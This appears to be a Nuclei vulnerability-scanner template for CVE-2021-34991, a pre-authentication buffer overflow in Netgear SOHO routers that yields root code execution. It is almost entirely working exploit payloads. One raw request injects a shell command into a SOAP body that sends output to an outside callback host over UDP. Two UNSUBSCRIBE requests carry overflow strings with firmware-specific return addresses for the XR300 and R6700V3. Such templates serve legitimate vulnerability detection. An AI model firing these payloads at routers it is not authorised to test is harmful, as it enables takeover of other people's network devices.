id: CVE-2021-34991

info:
  name: Netgear SOHO Pre-Auth BoF to RCE
  author: dwisiswant0
  severity: high
  description: |
    Netgear SOHO Devices contain a vulnerability that allows
    an attacker within the deviceâ€™s Local Area Network (LAN)
    to obtain Remote Code Execution (RCE) as root on the device.
  reference:
    - https://github.com/grimm-co/NotQuite0DayFriday/tree/trunk/2021.11.16-netgear-upnp
    - https://kb.netgear.com/000064361/Security-Advisory-for-Pre-Authentication-Buffer-Overflow-on-Multiple-Products-PSV-2021-0168
    - https://nvd.nist.gov/vuln/detail/CVE-2021-34991
  tags: cve,cve2021,netgear,overflow,rce

requests:
  - raw:
      - |+
        POST /Public_UPNP_C5 HTTP/1.1
        Host: {{Hostname}}:{{Port}}
        SOAPAction
        Content-Length: 170

        <?xml version="1.0"?> <SOAP-ENV:Envelope> Body>:id >& /dev/udp/{{interact-url}}/90001;Body > </SOAP-ENV:Body> </SOAP-ENV:Envelope>

      # for router XR300 (1.0.3.56)
      - |+
        UNSUBSCRIBE /Public_UPNP_Event_1 HTTP/1.1
        Host: {{Hostname}}:{{Port}}
        SID: {{tolower(rand_text_alpha(8))}}
        UUID: {{toupper(rand_base(67, "", "A"))}}BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII\xa84\x01

        {{toupper(rand_base(1093, "", "J"))}}H\xb7\x05\x00KKKKKKKKKKKK\xe0\xe7\x02\x00

      # for router R6700V3 (1.0.4.118)
      - |+
        UNSUBSCRIBE /Public_UPNP_Event_1 HTTP/1.1
        Host: {{Hostname}}:{{Port}}
        SID: {{tolower(rand_text_alpha(8))}}
        UUID: {{toupper(rand_base(67, "", "A"))}}BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII\xa84\x01

        {{toupper(rand_base(1105, "", "J"))}}\xd0j\x06\x00KKKKKKKKKKKKP\x81\x01\x00

    cookie-reuse: true
    matchers:
      - type: word
        part: interactsh_protocol  # Confirms the DNS Interaction
        words:
          - "dns"
